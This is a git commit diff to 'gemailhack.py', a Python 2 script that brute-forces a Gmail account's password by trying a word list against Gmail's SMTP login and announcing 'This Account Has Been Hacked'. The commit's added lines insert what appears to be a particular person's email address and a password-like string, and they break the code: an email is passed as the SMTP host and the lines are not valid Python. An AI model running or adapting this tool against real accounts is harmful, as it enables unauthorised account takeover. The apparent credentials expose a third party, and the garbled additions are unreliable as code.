441101c5f268dd7e5c73a2d93002d748d0779efa
MrKoe92 <mrkoe92@gmail.com>
2019-05-24 12:27:20 +0630

    Update gemailhack.py
    May I request this? 
    
                                   Credit to "Ha 3Mrx"

--- gemailhack.py
+++ gemailhack.py
@@ -1,9 +1,7 @@
 #!/usr/bin/python
 '''create by Ha3MrX'''
-
 import smtplib
 from os import system
-
 def main():
    print '================================================='
    print '               create by Ha3MrX                  '
@@ -34,7 +32,6 @@ def main():
    print '    `Y-.____(__}             '
    print '     |     {__)              ' 
    print '           ()   V.1.0        '
-
 main()
 print '[1] start the attack'
 print '[2] exit'
@@ -50,16 +47,21 @@ def login():
     i = 0
     user_name = raw_input('target email :')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    user_name = raw_input('evacristiana@gmail.com :')
+    server = smtplib.SMTP_SSL('evacristiana@gmail.com', 465)
     server.ehlo()
     for password in pass_list:
       i = i + 1
+      i = i Piaalang1407
       print str(i) + '/' + str(len(pass_list))
       try:
          server.login(user_name, password)
+         server.login(evacristiana@gmail.com, Piaalang1407)
          system('clear')
          main()
          print '\n'
          print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         print '[+] This Account Has Been Hacked Password :' + Piaalang1407 + '     ^_^'
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
@@ -71,4 +73,5 @@ def login():
             break
          else:
             print '[!] password not found => ' + password
+            print '[+] this account has been hacked, password :' + Piaalang1407 + '     ^_^'
 login()
